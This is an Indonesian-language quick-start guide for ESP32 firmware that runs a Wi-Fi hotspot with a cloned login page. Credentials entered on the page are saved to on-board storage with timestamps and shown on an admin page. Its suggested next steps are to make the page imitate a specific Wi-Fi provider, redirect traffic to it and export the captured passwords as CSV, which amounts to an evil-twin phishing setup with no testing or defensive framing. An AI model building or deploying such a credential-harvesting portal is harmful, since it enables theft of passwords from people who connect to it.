# 🚀 Quick Start - Clone WiFi Login Credentials

## 📋 Requirement
- ESP32 DevKit (atau board ESP32 lainnya)
- USB Cable untuk connect ke komputer
- PlatformIO (sudah diinstall di `.venv`)

---

## 🔨 STEP 1: Build & Flash Firmware

### Option A: Gunakan PlatformIO CLI (Recommended)

Buka PowerShell di folder project root (`WifiPisseryakntl`), lalu jalankan:

```powershell
# 1. Activate Python venv (optional)
.\.venv\Scripts\Activate.ps1

# 2. Build firmware
python -m platformio run -e esp32

# 3. Flash ke ESP32 (pastikan USB sudah terhubung)
python -m platformio run -e esp32 --target upload
```

**Expected Output:**
```
Building project...
Linking .pio/build/esp32/firmware.elf
Building .pio/build/esp32/firmware.bin
============= [SUCCESS] =====================
Uploading .pio/build/esp32/firmware.bin
...
==================== upload complete ====================
```

### Option B: Gunakan VS Code PlatformIO Extension

1. Buka project di VS Code
2. Klik **PlatformIO: Home** di sidebar kiri
3. Pilih **esp32** board
4. Klik tombol **Build** (checkmark icon)
5. Setelah build selesai, klik **Upload** (arrow icon)

---

## 📡 STEP 2: Connect ke ESP32 WiFi Hotspot

Setelah firmware berhasil di-flash:

### Di Windows:
1. Buka **Settings → Network & Internet → WiFi**
2. Cari dan hubungkan ke WiFi hotspot ESP32 (nama SSID default: `Esp32AP`)
3. Password: `12345678` (default dari `sdkconfig.esp32`)

### Di Linux/Mac:
```bash
# Cari WiFi hotspot
nmcli dev wifi list

# Connect
nmcli dev wifi connect "Esp32AP" password "12345678"
```

---

## 🌐 STEP 3: Akses Web Interface

Buka browser dan akses salah satu dari:

### **Admin Page** (untuk melihat captured credentials):
```
http://192.168.4.1/
```

### **Login Clone Page** (untuk test login):
```
http://192.168.4.1/login.html
```

---

## 🧪 Test Flow

### 1. **Test Login Page**
1. Akses `http://192.168.4.1/login.html`
2. Akan melihat form login sederhana dengan:
   - Username input
   - Password input
   - Login button

### 2. **Masukkan Credentials**
```
Username: admin
Password: 12345
```

### 3. **Lihat Credentials di Admin Page**
1. Akses `http://192.168.4.1/` (Admin Page)
2. Klik tab **"Passwords"** 
3. Klik tombol **"UPDATE"**
4. Akan melihat credentials yang tertangkap:
```
admin --- 12345
```

---

## 📊 File Structure Credentials

Credentials disimpan di ESP32 SPIFFS (file system):
```
/spiffs/credentials.txt
Format: username|password|timestamp

Contoh:
admin|12345|2026-01-10 11:16:49
user@example.com|mypass123|2026-01-10 11:17:30
```

---

## 🔧 Troubleshooting

### Build Error: "Unknown platform"
```powershell
# Clean cache
python -m platformio system prune -f

# Rebuild
python -m platformio run -e esp32
```

### ESP32 tidak terdeteksi saat upload
```powershell
# List available COM ports
python -m platformio device list

# Jika perlu specify port
python -m platformio run -e esp32 --target upload --upload-port COM3
```

### Tidak bisa connect ke WiFi hotspot
- Reset ESP32 dengan menekan RESET button
- Tunggu ~5 detik sampai WiFi hotspot muncul
- Check di `sdkconfig.esp32` untuk SSID dan password default

### Website tidak bisa diakses (192.168.4.1)
1. Pastikan sudah connect ke WiFi hotspot ESP32
2. Cek IP address: buka CMD, ketik `ipconfig` dan cari IP yang dimulai `192.168.4.x`
3. Test ping ESP32: `ping 192.168.4.1`

---

## 📝 Summary Code Changes

Implementasi yang sudah dilakukan:

| File | Fungsi |
|------|--------|
| `include/web/wifi_clone_login.h` | HTML login form (simple design) |
| `src/server.c` | Handler untuk `/login` POST dan `/login.html` GET |
| `src/passwordMng.c` | Fungsi save & read credentials |
| `include/passwordMng.h` | Function declarations |
| `src/admin_server.c` | Updated handler untuk menampilkan credentials |

---

## 🎯 Next Steps (Optional)

1. **Customize login page** - ubah HTML di `wifi_clone_login.h` untuk tampil seperti WiFi provider tertentu
2. **Auto redirect** - setup sehingga semua traffic ke domain tertentu redirect ke login page
3. **Export credentials** - tambah fitur download CSV di admin page
4. **Clear credentials** - tambah tombol untuk hapus semua captured passwords

---

**Good luck! 🎉**
